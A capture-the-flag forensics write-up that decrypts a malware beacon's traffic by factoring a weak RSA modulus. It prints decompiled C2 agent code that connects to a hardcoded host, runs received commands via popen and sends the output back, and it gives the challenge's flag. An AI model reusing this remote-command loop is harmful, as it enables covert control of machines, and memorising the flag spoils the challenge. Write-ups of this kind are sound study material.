## Name: Structured Annuity
#### Category: Forensics
#### Difficulty: Hard
#### Description: These J.G. Wentworth ads are getting out of hand! Now we're evem getting reports that they're using malware to try and get people cash for their structured settlements! Luckily, we were able to capture some network traffic of this c2 beacon, along with the binary and a memory capture of the running process. Unfortunately, it seems like the c2 agent contains no static keys and instead generates them at run time. Can you decrypt their comms?

## Procedure
This chall has the following files:
```
structuredAnnuity/
├── structured_annuity # Binary file
├── structured_annuity.dump # binary dump
└── structured_annuity.pcapng #Wireshark capture
```
The first file I have seen was the pcapng file, using the command ```tshark -r structuredAnnuity/structured_annuity.pcapng -T fields -e data``` i have seen some interesting encrypted data, When i saw the value ```65537```, I knew the Cipher method was RSA Encryption, because ```65537``` is  the common value for ```e```

![2024-09-24_16-28](https://github.com/user-attachments/assets/d6acfab1-a31c-401f-a61e-8e6bbcc4025d)


```
56048657891568470071072200352453435307145615629716429378285176310839997106837:65537
34052883331862194561588316384768805552479914185714526668665063402813300904421:65537
26837762086290757052486642102560852925225702609872568979330654281329444894706
29977567988592954316835508906387630123424709642590239142264084540225085777016
```

next step is open the bin file ```structured_annuity``` and check every function in order to recover the private key used to encrypt our flag in ```26837762086290757052486642102560852925225702609872568979330654281329444894706``` or ```29977567988592954316835508906387630123424709642590239142264084540225085777016```

here, we open the binary file using ghidra, this shows us the following code

#### main content
1) It creates a socket and establishes a connection to a server (172.30.240.1) on port 0x2329 (9001 in decimal). The connect() function is used to check the connection status.
2) The client's RSA private key is initialized with the name "privkey".
3) The client connects to the server at 172.30.240.1:9001.
4) The client's public key (n, e) is sent to the server.
   
```
int main(void)

{
  long lVar1;
  rsaKeyStore rsa_00;
  rsaKeyStore rsa_01;
  int iVar2;
  int iVar3;
  size_t sVar4;
  FILE *__stream;
  char *pcVar5;
  long in_FS_OFFSET;
  int sockD;
  int connectStatus;
  FILE *fp;
  sockaddr_in servAddr;
  mpz_t encrypted;
  mpz_t decrypted;
  mpz_t message;
  mpz_t encryptedm;
  rsaKeyStore rsa;
  rsaKeyStore serverPublic;
  char strData [1024];
  char pubkey [1024];
  char commandOutput [1024];
  char testing [1024];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  init_rsa();
  rsa.name[0] = 'p';
  rsa.name[1] = 'r';
  rsa.name[2] = 'i';
  rsa.name[3] = 'v';
  rsa.name[4] = 'k';
  rsa.name[5] = 'e';
  rsa.name[6] = 'y';
  rsa.name[7] = '\0';
  iVar2 = socket(2,1,0);
  servAddr.sin_family = 2;
  servAddr.sin_port = htons(0x2329);
  inet_aton("172.30.240.1",(in_addr *)&servAddr.sin_addr);
  iVar3 = connect(iVar2,(sockaddr *)&servAddr,0x10);
  if (iVar3 == -1) {
    puts("Error...");
    iVar2 = 0;
  }
  else {
    puts("%Zd:%Zd\n");
    __gmp_sprintf(pubkey,"%Zd:%Zd\n",rsa.n,rsa.e);
    sVar4 = strlen(pubkey);
    send(iVar2,pubkey,sVar4,0);
    recv(iVar2,strData,0x400,0);
    __gmpz_inits(serverPublic.n,serverPublic.e,0);
    __gmp_sscanf(strData,"%Zd:%Zd\n",serverPublic.n,serverPublic.e);
    puts("GOT SERVER PUBLIC KEY\n%Zd\n%Zd\n");
    memset(strData,0,0x400);
    while( true ) {
      __gmpz_inits(encrypted,decrypted,0);
      recv(iVar2,strData,0x400,0);
      __gmp_sscanf(strData,&DAT_00103047,encrypted);
      rsa_00.p[0]._mp_alloc = rsa.p[0]._mp_alloc;
      rsa_00.p[0]._mp_size = rsa.p[0]._mp_size;
      rsa_00.name[0] = rsa.name[0];
      rsa_00.name[1] = rsa.name[1];
      rsa_00.name[2] = rsa.name[2];
      rsa_00.name[3] = rsa.name[3];
      rsa_00.name[4] = rsa.name[4];
      rsa_00.name[5] = rsa.name[5];
      rsa_00.name[6] = rsa.name[6];
      rsa_00.name[7] = rsa.name[7];
      rsa_00.p[0]._mp_d = rsa.p[0]._mp_d;
      rsa_00.q[0]._mp_alloc = rsa.q[0]._mp_alloc;
      rsa_00.q[0]._mp_size = rsa.q[0]._mp_size;
      rsa_00.q[0]._mp_d = rsa.q[0]._mp_d;
      rsa_00.e[0]._mp_alloc = rsa.e[0]._mp_alloc;
      rsa_00.e[0]._mp_size = rsa.e[0]._mp_size;
      rsa_00.e[0]._mp_d = rsa.e[0]._mp_d;
      rsa_00.d[0]._mp_alloc = rsa.d[0]._mp_alloc;
      rsa_00.d[0]._mp_size = rsa.d[0]._mp_size;
      rsa_00.d[0]._mp_d = rsa.d[0]._mp_d;
      rsa_00.n[0]._mp_alloc = rsa.n[0]._mp_alloc;
      rsa_00.n[0]._mp_size = rsa.n[0]._mp_size;
      rsa_00.n[0]._mp_d = rsa.n[0]._mp_d;
      rsa_00.phi[0]._mp_alloc = rsa.phi[0]._mp_alloc;
      rsa_00.phi[0]._mp_size = rsa.phi[0]._mp_size;
      rsa_00.phi[0]._mp_d = rsa.phi[0]._mp_d;
      rsa_decrypt(rsa_00,decrypted,encrypted);
      memset(strData,0,0x400);
      mpzToCharArray(strData,decrypted);
      printf("Command: %s",strData);
      __stream = popen(strData,"r");
      if (__stream == (FILE *)0x0) break;
      while( true ) {
        pcVar5 = fgets(commandOutput,0x400,__stream);
        if (pcVar5 == (char *)0x0) break;
        __gmpz_inits(message,encryptedm,0);
        charArrayToMpz(message,commandOutput);
        rsa_01.p[0]._mp_alloc = serverPublic.p[0]._mp_alloc;
        rsa_01.p[0]._mp_size = serverPublic.p[0]._mp_size;
        rsa_01.name[0] = serverPublic.name[0];
        rsa_01.name[1] = serverPublic.name[1];
        rsa_01.name[2] = serverPublic.name[2];
        rsa_01.name[3] = serverPublic.name[3];
        rsa_01.name[4] = serverPublic.name[4];
        rsa_01.name[5] = serverPublic.name[5];
        rsa_01.name[6] = serverPublic.name[6];
        rsa_01.name[7] = serverPublic.name[7];
        rsa_01.p[0]._mp_d = serverPublic.p[0]._mp_d;
        rsa_01.q[0]._mp_alloc = serverPublic.q[0]._mp_alloc;
        rsa_01.q[0]._mp_size = serverPublic.q[0]._mp_size;
        rsa_01.q[0]._mp_d = serverPublic.q[0]._mp_d;
        rsa_01.e[0]._mp_alloc = serverPublic.e[0]._mp_alloc;
        rsa_01.e[0]._mp_size = serverPublic.e[0]._mp_size;
        rsa_01.e[0]._mp_d = serverPublic.e[0]._mp_d;
        rsa_01.d[0]._mp_alloc = serverPublic.d[0]._mp_alloc;
        rsa_01.d[0]._mp_size = serverPublic.d[0]._mp_size;
        rsa_01.d[0]._mp_d = serverPublic.d[0]._mp_d;
        rsa_01.n[0]._mp_alloc = serverPublic.n[0]._mp_alloc;
        rsa_01.n[0]._mp_size = serverPublic.n[0]._mp_size;
        rsa_01.n[0]._mp_d = serverPublic.n[0]._mp_d;
        rsa_01.phi[0]._mp_alloc = serverPublic.phi[0]._mp_alloc;
        rsa_01.phi[0]._mp_size = serverPublic.phi[0]._mp_size;
        rsa_01.phi[0]._mp_d = serverPublic.phi[0]._mp_d;
        rsa_encrypt(rsa_01,encryptedm,message);
        __gmp_sprintf(testing,&DAT_00103066,encryptedm);
        sVar4 = strlen(testing);
        send(iVar2,testing,sVar4,0);
        memset(testing,0,0x400);
      }
      pclose(__stream);
    }
    perror("popen failed");
    iVar2 = 1;
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}

```

Now, i have ran the command ```strings structured_annuity.dump```, this shows us the following output

```
privkey
echo Womp Womp, flag is gone !
56048657891568470071072200352453435307145615629716429378285176310839997106837:65537
```

this was the value we found before in pcapng file, this is probably the value for N (Modulus), the length is very short, maybe we can recover the private key using a factorization agains the modulus, u can do it using ```factorint``` from ```sympy``` library or using [alpertron](https://www.alpertron.com.ar/ECM.HTM), with factor options agains ```56048657891568470071072200352453435307145615629716429378285176310839997106837```

output
```
p = 168671056797319678404059216640521393881
q = 332295646661645445201577206886078338077
```

With value ```p``` and ```q``` allows us to calculate [phi](https://en.wikipedia.org/wiki/Euler%27s_totient_function), from here we will able to calculate our private key.
I have written the following code.

```

N = 56048657891568470071072200352453435307145615629716429378285176310839997106837
e = 65537

p = 168671056797319678404059216640521393881
q = 332295646661645445201577206886078338077

phi = (p-1)*(q-1)
d = pow(e,-1,phi)
print("private key:",d)

c=26837762086290757052486642102560852925225702609872568979330654281329444894706

flag = pow(c,d,N)
print(bytes.fromhex(hex(flag).replace("0x","")))

```

output
```
private key: 45672254238694517229588473497755821278301582789231329188960528375453326722433
b'echo PCTF{8U7_I_N33D_C@5H_N0W}'
```

